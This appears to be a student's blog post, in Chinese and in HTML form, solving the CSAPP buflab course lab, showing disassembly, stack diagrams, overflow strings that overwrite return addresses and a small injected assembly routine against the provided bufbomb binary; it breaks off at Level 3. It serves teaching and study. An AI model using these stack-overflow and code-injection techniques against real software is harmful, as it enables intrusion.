@@ -1,0 +1,756 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Wu Yuhan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="深入理解计算机系统课程实验buflab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP-buflab">
+<meta property="og:url" content="http://yuhan2001.github.io/2021/05/01/buflab/index.html">
+<meta property="og:site_name" content="Yuhan&#39;s blog">
+<meta property="og:description" content="深入理解计算机系统课程实验buflab">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210531221833088-1625461218128.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601102016862-1625461220546.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210531220802038-1625461222317.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210531221856751-1625461140489-1625461223465.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601164519079.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601110032585.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601110124902.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601164928822.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601165635051.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601171331126.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601172034515.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601194717582.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601173336057.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601173259876.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601193213300.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601201352918-1625461248265.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602084151289.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601201240748.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601201456344.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210601201603573.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602084724410.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602084741390.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602084801354.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602084816623.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602084857133.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602090320808.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602091128347.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602091213381.png">
+<meta property="og:image" content="http://yuhan2001.github.io/buflab/image-20210602091240597.png">
+<meta property="article:published_time" content="2021-04-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-04T13:06:09.431Z">
+<meta property="article:author" content="Wu Yuhan">
+<meta property="article:tag" content="深入理解计算机系统">
+<meta property="article:tag" content="CSAPP-LAB">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://yuhan2001.github.io/buflab/image-20210531221833088-1625461218128.png">
+  
+  
+  <title>CSAPP-buflab - Yuhan&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yuhan2001.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"6da93a2e5d7f160e0f40b273ddbbddac","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Yuhan&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/3.jpeg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CSAPP-buflab">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-01 00:00" pubdate>
+        2021年5月1日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      12k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      99 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CSAPP-buflab</h1>
+            
+            <div class="markdown-body">
+              <h1 id="buflab"><a href="#buflab" class="headerlink" title="buflab"></a>buflab</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>​	详细了解IA-32调用惯例和堆栈结构。它涉及对lab目录中的可执行文件bufbomb应用一系列缓冲区溢出攻击。</p>
+<h2 id="实验环境和工具"><a href="#实验环境和工具" class="headerlink" title="实验环境和工具"></a>实验环境和工具</h2><p>​	ubuntu 12.04.5 (32位) ；</p>
+<p>​	gdb 7.4 ；</p>
+<h2 id="实验内容及操作步骤"><a href="#实验内容及操作步骤" class="headerlink" title="实验内容及操作步骤"></a>实验内容及操作步骤</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="阅读Readme-txt和buflab-writeup-pdf的前几页"><a href="#阅读Readme-txt和buflab-writeup-pdf的前几页" class="headerlink" title="阅读Readme.txt和buflab-writeup.pdf的前几页"></a>阅读Readme.txt和buflab-writeup.pdf的前几页</h4><p>按照Readme.txt的要求，任意输入一个字符作为userid。使用makecookie生成cookie。我这里输入的字符为h，得到<code>cookie:0x20083f2f</code>。</p>
+<p><img src="/buflab/image-20210531221833088-1625461218128.png" srcset="/img/loading.gif" lazyload alt="image-20210531221833088"></p>
+<h4 id="在linux下解压buflab-handout-tar-gz"><a href="#在linux下解压buflab-handout-tar-gz" class="headerlink" title="在linux下解压buflab-handout.tar.gz"></a>在linux下解压buflab-handout.tar.gz</h4><h3 id="Level-0-Candle-10-pts"><a href="#Level-0-Candle-10-pts" class="headerlink" title="Level 0: Candle (10 pts)"></a>Level 0: Candle (10 pts)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <br>&#123;<br>	<span class="hljs-type">int</span> val;<br>	<span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span> <br>	<span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> local = uniqueval();<br>	<br>	val = getbuf();<br>	<br>	<span class="hljs-comment">/* Check for corrupted stack */</span> <br>	<span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>); <br>	&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val); <br>		validate(<span class="hljs-number">3</span>);<br>	&#125; <br>	<span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h4><p>​	让BUFBOMB在<code>getbuf</code>执行其<code>return</code>语句时执行<code>smoke</code>的代码，而不是返回<code>test</code>。</p>
+<p>​	注意：利用漏洞字符串还可能损坏堆栈中与此阶段不直接相关的部分，但这不会导致问题，因为冒烟会导致程序直接退出。</p>
+<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>​	<code>getbuf()</code>的反汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function getbuf:<br>   0x08049262 &lt;+0&gt;:		push   %ebp<br>   0x08049263 &lt;+1&gt;:		mov    %esp,%ebp<br>   0x08049265 &lt;+3&gt;:		sub    $0x38,%esp<br>   0x08049268 &lt;+6&gt;:		lea    -0x28(%ebp),%eax<br>   0x0804926b &lt;+9&gt;:		mov    %eax,(%esp)<br>   0x0804926e &lt;+12&gt;:	call   0x8048c32 &lt;Gets&gt;<br>   0x08049273 &lt;+17&gt;:	mov    $0x1,%eax<br>   0x08049278 &lt;+22&gt;:	leave  						;恢复旧ebp<br>   0x08049279 &lt;+23&gt;:	ret    						;返回地址出栈，存储在eip中<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><p>由<code>lea    -0x28(%ebp),%eax</code>和<code>mov    %eax,(%esp)</code>可知，<code>ebp-0x28</code>的地址为<code>Gets()</code>函数的参数。<code>Gets()</code>将以该地址为起点向地址增大的方向保存字符。<code>getbuf()</code>的部分栈帧示意图如下：</p>
+<p><img src="/buflab/image-20210601102016862-1625461220546.png" srcset="/img/loading.gif" lazyload alt="image-20210601102016862"></p>
+</li>
+<li><p>因此需要将<code>getbuf()</code>的返回地址覆盖为<code>smoke()第一条语句的地址</code>。<code>smoke()</code>的汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function smoke:<br>   0x08048e0a &lt;+0&gt;:		push   %ebp<br>   0x08048e0b &lt;+1&gt;:		mov    %esp,%ebp<br>   0x08048e0d &lt;+3&gt;:		sub    $0x18,%esp<br>   0x08048e10 &lt;+6&gt;:		movl   $0x804a2fe,0x4(%esp)<br>   0x08048e18 &lt;+14&gt;:	movl   $0x1,(%esp)<br>   0x08048e1f &lt;+21&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048e24 &lt;+26&gt;:	movl   $0x0,(%esp)<br>   0x08048e2b &lt;+33&gt;:	call   0x8049280 &lt;validate&gt;<br>   0x08048e30 &lt;+38&gt;:	movl   $0x0,(%esp)<br>   0x08048e37 &lt;+45&gt;:	call   0x80488d0 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure>
+
+<p>首地址为<code>0x08048e0a</code>。由于<code>0x0a</code>为<code>&#39;\n&#39;</code>，故选用<code>0x08048e0b</code>注入。</p>
+<p>构造的字符串为（40+4）个字符（除了0x0a以外的任意字符），再加上<code>0b 8e 04 08</code>(小端法)。txt文件如下：</p>
+<p><img src="/buflab/image-20210531220802038-1625461222317.png" srcset="/img/loading.gif" lazyload alt="image-20210531220802038"></p>
+</li>
+</ul>
+<h4 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h4><p><img src="/buflab/image-20210531221856751-1625461140489-1625461223465.png" srcset="/img/loading.gif" lazyload alt="image-20210531221856751"></p>
+<h3 id="Level-1-Sparkler-10-pts"><a href="#Level-1-Sparkler-10-pts" class="headerlink" title="Level 1: Sparkler (10 pts)"></a>Level 1: Sparkler (10 pts)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fizz</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> <br>&#123;<br>	<span class="hljs-keyword">if</span> (val == cookie) <br>    &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); <br>        validate(<span class="hljs-number">1</span>);<br>	&#125; <span class="hljs-keyword">else</span> <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val); <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="目标：-1"><a href="#目标：-1" class="headerlink" title="目标："></a>目标：</h4><p>​		与Level 0类似，让<code>BUFBOMB</code>执行<code>fizz</code>的代码，而不是返回<code>test</code>。但是，您必须使它看起来像fizz，就好像传递了cookie作为它的参数。</p>
+<h4 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h4><p><code>fizz</code>的反汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function fizz:<br>   0x08048daf &lt;+0&gt;:		push   %ebp					;esp=esp-4<br>   0x08048db0 &lt;+1&gt;:		mov    %esp,%ebp			;保存esp的值到ebp<br>   0x08048db2 &lt;+3&gt;:		sub    $0x18,%esp<br>   0x08048db5 &lt;+6&gt;:		mov    0x8(%ebp),%eax		;参数=M[ebp+8]<br>   0x08048db8 &lt;+9&gt;:		cmp    0x804d104,%eax<br>   0x08048dbe &lt;+15&gt;:	jne    0x8048de6 &lt;fizz+55&gt;<br>   0x08048dc0 &lt;+17&gt;:	mov    %eax,0x8(%esp)<br>   0x08048dc4 &lt;+21&gt;:	movl   $0x804a2e0,0x4(%esp)<br>   0x08048dcc &lt;+29&gt;:	movl   $0x1,(%esp)<br>   0x08048dd3 &lt;+36&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048dd8 &lt;+41&gt;:	movl   $0x1,(%esp)<br>   0x08048ddf &lt;+48&gt;:	call   0x8049280 &lt;validate&gt;<br>   0x08048de4 &lt;+53&gt;:	jmp    0x8048dfe &lt;fizz+79&gt;<br>   0x08048de6 &lt;+55&gt;:	mov    %eax,0x8(%esp)<br>   0x08048dea &lt;+59&gt;:	movl   $0x804a4d4,0x4(%esp)<br>   0x08048df2 &lt;+67&gt;:	movl   $0x1,(%esp)<br>   0x08048df9 &lt;+74&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048dfe &lt;+79&gt;:	movl   $0x0,(%esp)<br>   0x08048e05 &lt;+86&gt;:	call   0x80488d0 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><p>由<code>mov    0x8(%ebp),%eax</code>可知，此时<code>ebp+0x8</code>的地址保存的是<code>fizz()</code>的参数。其余类似Level0。更改<code>getbuf()</code>的返回地址为<code>fizz()</code>的入口地址后，进入<code>fizz()</code>前的部分栈帧示意图如下。进入fizz()后，esp的值加4，之后<code>push   %ebp</code>，esp的值减4，再由<code>mov    %esp,%ebp</code>，我们可以确定<code>fizz()</code>的参数的地址。</p>
+<p><img src="/buflab/image-20210601164519079.png" srcset="/img/loading.gif" lazyload alt="image-20210601164519079"></p>
+</li>
+<li><p>构造字符串为（40+4）个字符（除了0x0a以外的任意字符），加上<code>af 8d 04 08</code>（<code>fizz()</code>的入口地址，小端法），再加上4个字符<br>（除了0x0a以外的任意字符），最后加上cookie：<code>2f 3f 08 20</code>（小端法）。txt文件如下：</p>
+<p><img src="/buflab/image-20210601110032585.png" srcset="/img/loading.gif" lazyload alt="image-20210601110032585"></p>
+</li>
+</ul>
+<h4 id="结果：-1"><a href="#结果：-1" class="headerlink" title="结果："></a>结果：</h4><p><img src="/buflab/image-20210601110124902.png" srcset="/img/loading.gif" lazyload alt="image-20210601110124902"></p>
+<h3 id="Level-2-Firecracker-15-pts"><a href="#Level-2-Firecracker-15-pts" class="headerlink" title="Level 2: Firecracker (15 pts)"></a>Level 2: Firecracker (15 pts)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> global_value = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bang</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> &#123;<br>	<span class="hljs-keyword">if</span> (global_value == cookie) &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value); <br>        validate(<span class="hljs-number">2</span>);<br>	&#125; <span class="hljs-keyword">else</span> <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);<br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="目标：-2"><a href="#目标：-2" class="headerlink" title="目标："></a>目标：</h4><p>​		与级别0和1类似，让<code>BUFBOMB</code>执行<code>bang</code>的代码，而不是返回<code>test</code>。但在此之前，必须将全局变量<code>global_value</code>设置为用户id的<code>cookie</code>。攻击代码应该设置全局变量，将<code>bang</code>的地址推送到堆栈上，然后执行<code>ret</code>指令以跳转到<code>bang</code>的代码。</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p><code>bang</code>的反汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function bang:<br>   0x08048d52 &lt;+0&gt;:		push   %ebp<br>   0x08048d53 &lt;+1&gt;:		mov    %esp,%ebp<br>   0x08048d55 &lt;+3&gt;:		sub    $0x18,%esp<br>   0x08048d58 &lt;+6&gt;:		mov    0x804d10c,%eax<br>   0x08048d5d &lt;+11&gt;:	cmp    0x804d104,%eax			;比较地址0x804d10c和0x804d104所存的值<br>   0x08048d63 &lt;+17&gt;:	jne    0x8048d8b &lt;bang+57&gt;<br>   0x08048d65 &lt;+19&gt;:	mov    %eax,0x8(%esp)<br>   0x08048d69 &lt;+23&gt;:	movl   $0x804a4ac,0x4(%esp)<br>   0x08048d71 &lt;+31&gt;:	movl   $0x1,(%esp)<br>   0x08048d78 &lt;+38&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048d7d &lt;+43&gt;:	movl   $0x2,(%esp)<br>   0x08048d84 &lt;+50&gt;:	call   0x8049280 &lt;validate&gt;<br>   0x08048d89 &lt;+55&gt;:	jmp    0x8048da3 &lt;bang+81&gt;<br>   0x08048d8b &lt;+57&gt;:	mov    %eax,0x8(%esp)<br>   0x08048d8f &lt;+61&gt;:	movl   $0x804a2c2,0x4(%esp)<br>   0x08048d97 &lt;+69&gt;:	movl   $0x1,(%esp)<br>   0x08048d9e &lt;+76&gt;:	call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048da3 &lt;+81&gt;:	movl   $0x0,(%esp)<br>   0x08048daa &lt;+88&gt;:	call   0x80488d0 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li>查看地址0x804d10c的值和0x804d104的值，得到它们分别为<code>global_value</code>和<code>cookie</code>的值。</li>
+</ul>
+<p><img src="/buflab/image-20210601164928822.png" srcset="/img/loading.gif" lazyload alt="image-20210601164928822"></p>
+<ul>
+<li><p>而<code>getbuf</code>中的<code>ebp</code>位置为<code>0x55683610</code>（如下图），显然无法直接覆盖。</p>
+<p><img src="/buflab/image-20210601165635051.png" srcset="/img/loading.gif" lazyload alt="image-20210601165635051"></p>
+</li>
+<li><p>故可以编写汇编代码，然后把它们转换为字符编码放入堆栈中，以完成需要的操作。汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">/*bang.s*/<br>mov 	0x804d104,%eax	/*将cookie保存到eax*/<br>mov 	%eax,0x804d10c	/*将global_value设置为cookie的值*/<br>push	$0x08048d52		/*bang的函数入口地址入栈*/<br>ret						/*返回，进入bang函数*/<br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p>通过指令将.s文件编译为.o文件，查看反汇编代码，共16个字节：</p>
+<p><img src="/buflab/image-20210601171331126.png" srcset="/img/loading.gif" lazyload alt="image-20210601171331126"></p>
+</li>
+<li><p>我们可以把这段代码从<code>buf</code>的起始位置开始存放，而把<code>getbuf</code>的返回地址更改为<code>buf</code>的起始地址，以执行这段代码。经调试<code>getbuf</code>，<code>buf</code>的起始地址为：<code>0x556835b8</code>。</p>
+<p><img src="/buflab/image-20210601172034515.png" srcset="/img/loading.gif" lazyload alt="image-20210601172034515"></p>
+</li>
+<li><p>更改后的栈帧示意图如下：</p>
+<p><img src="/buflab/image-20210601194717582.png" srcset="/img/loading.gif" lazyload alt="image-20210601194717582"></p>
+</li>
+<li><p>故注入的字符串为代码的字符编码（共16个字节）+28个字节（除了0x0a以外的任意字符）+<code>b8 35 68 55</code>（buf的起始地址的小端法表示）。txt文件如下：</p>
+<p><img src="/buflab/image-20210601173336057.png" srcset="/img/loading.gif" lazyload alt="image-20210601173336057"></p>
+</li>
+</ul>
+<h4 id="结果：-2"><a href="#结果：-2" class="headerlink" title="结果："></a>结果：</h4><p><img src="/buflab/image-20210601173259876.png" srcset="/img/loading.gif" lazyload alt="image-20210601173259876"></p>
+<h3 id="Level-3-Dynamite-20-pts"><a href="#Level-3-Dynamite-20-pts" class="headerlink" title="Level 3: Dynamite (20 pts)"></a>Level 3: Dynamite (20 pts)</h3><p><code>test</code>的c代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <br>&#123;<br>	<span class="hljs-type">int</span> val;<br>	<span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span> <br>	<span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> local = uniqueval();<br>	<br>	val = getbuf();<br>	<br>	<span class="hljs-comment">/* Check for corrupted stack */</span> <br>	<span 